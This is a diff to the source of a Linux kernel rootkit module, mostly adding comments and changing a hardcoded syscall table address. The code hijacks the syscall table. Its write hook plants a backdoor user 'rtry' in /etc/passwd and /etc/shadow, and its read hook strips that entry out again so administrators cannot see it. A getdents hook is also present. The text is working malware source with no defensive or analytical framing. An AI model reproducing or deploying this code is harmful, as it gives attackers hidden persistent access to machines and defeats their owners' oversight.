@@ -41,6 +41,13 @@ asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
 asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
 
 
+/*
+ * hijacked_write : hooks the write syscall to add the backdoor account
+ *		   to the \etc\passwd file and \etc\shadow file
+ * fd : file descriptor
+ * buf : user buffer containing data to be written to files
+ * count : number of bytes to be written to file
+ */
 asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count) 
 {
 	char *kbuf = NULL, *path = NULL,*str = NULL;
@@ -59,16 +66,25 @@ asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count)
 		num_writes = -ENOMEM;
 		goto out;
 	}
+  	/* get the file name */
 	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
 	path_len = strlen(path);
+
+	/* check if the opened file is passwd or shadow file */
 	if(path_len >= 11 && strstr(path, passwd) == path)
 			str = "rtry:x:1001:1001::/home/rtry:/bin/sh\n";
 	else if(path_len >= 11 && strstr(path, shadow) == path)
 		str = "rtry:!:17128:0:99999:7:::\n";
 	if(str != NULL && count != 0) {
+		/* copy user buf data into the temporary buffer kbuf */
 		copy_from_user(kbuf,buf,PAGE_SIZE);
+		/* 
+		 *the write syscall requires use buffer, 
+		 *so copy the str into user buffer buf
+		 */
 		copy_to_user(buf,str,strlen(str));
 		real_write(fd,buf,strlen(str));
+		/*revert the user buffer to its original state */
 		copy_to_user(buf,kbuf,PAGE_SIZE);
 	}
 	
@@ -78,6 +94,14 @@ out:
 	return num_writes;
 }
 
+
+/*
+ * hijacked_read : hooks the read syscall to hide the backdoor account
+ *		  from the \etc\passwd file and \etc\shadow file
+ * fd : file descriptor
+ * buf : user buffer for read data to be written into
+ * count : number of bytes to be read from file
+ */
 asmlinkage long hijacked_read(unsigned int fd, char __user *userbuf, size_t count)
 {
 	char *kbuf = NULL, *path = NULL, *buf = NULL;
@@ -96,21 +120,25 @@ asmlinkage long hijacked_read(unsigned int fd, char __user *userbuf, size_t coun
 		goto out;
 	}
 	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
+	/* check if the open file is passwd or shadow file */
 	if(strcmp(path,"/etc/passwd") == 0) 
 		str = "rtry:x:1001:1001::/home/rtry:/bin/sh\n";
 	else if(strcmp(path,"/etc/shadow") == 0)
 		str = "rtry:!:17128:0:99999:7:::\n";
+	/* removes the backdoor account from the files  */
 	if(str != NULL) {
 		buf = kmalloc(num_reads, GFP_KERNEL);
 		if(buf == NULL){
 			num_reads= -ENOMEM;
 			goto out;
 		}
+		/* copy the user buffer into kernel space */
 		if(copy_from_user(buf,userbuf,strlen(userbuf))!=0){
 			goto out;
 		}
-
+		/* get pointer to backdoor account */
 		try = strnstr(buf,str,num_reads);
+		/* if present, remove the backdoor account from buffer */
 		if(try != NULL) {
 			len = strlen(str);	
 			len1 = (buf + num_reads) - (try + len);
@@ -124,6 +152,10 @@ out:
 	if(kbuf != NULL) {
 		kfree(kbuf);
 	}
+	/*
+	 * return the number of bytes read from the file - 
+	 * the length of bacckdoor account string
+	 */
 	return num_reads - len;
 }
 
@@ -260,7 +292,7 @@ asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 
 
 
-// make the address writable if it is write-protected.
+/* make the address writable if it is write-protected.*/
 int make_rw(unsigned long address){
 	unsigned int level;
       	pte_t *pte = lookup_address(address, &level);
@@ -298,12 +330,11 @@ void hijack_sys_call_table(void){
 int init_module(void){
 	
 	/*
-	pointer to the system call table. The address is currently hardcoded,
-	taken from the /boot/System map file. This address seems to be the same
-	after every boot, so for now it can be hardcoded.
-	*/
-	sys_call_table = (unsigned long*)0xc1688140;
-	//sys_call_table = (unsigned long*)0xc15c3060;
+	 * pointer to the system call table. The address is currently hardcoded,
+	 * taken from the /boot/System map file. This address seems to be same
+	 * after every boot, so for now it can be hardcoded.
+	 */
+	sys_call_table = (unsigned long*)0xc15c3060;
 	hijack_sys_call_table();	
 	
 
